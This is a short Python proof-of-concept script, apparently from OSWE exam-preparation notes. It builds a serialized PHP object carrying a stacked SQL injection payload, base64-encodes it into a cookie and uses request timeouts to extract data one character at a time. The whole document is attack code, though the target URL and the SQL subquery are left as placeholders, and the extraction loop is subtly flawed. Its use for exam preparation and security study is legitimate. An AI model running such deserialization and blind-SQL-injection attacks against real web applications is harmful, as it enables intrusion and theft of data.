# https://jorgectf.gitbook.io/awae-oswe-preparation-resources/general/pocs/deserialization/php

import requests
from requests.exceptions import Timeout
import base64
import string
import time

url = ""

extracted = ""
while True:
    for char in string.digits + string.ascii_letters + "#" + "$" + "-" + "." + "{" + "}" + " " + "(" + ")":

        payload = f"""[ESCAPE]; [SUBQUERY] AND 1=randomblob(9000000000);--""" # Stacked query

        injection = 'O:3:"POC":1:{s:4:"test";s:%s:"%s";}' % (len(payload), payload)
        injection = injection.encode("utf-8")

        cookies = {'cookie': f"{base64.b64encode(injection).decode()}"}

        for i in range(1):
            try:
                r = requests.get(url, cookies=cookies, timeout=1.1)
            except KeyboardInterrupt:
                exit()
            except:
                extracted= extracted + char       
        print(payload, extracted)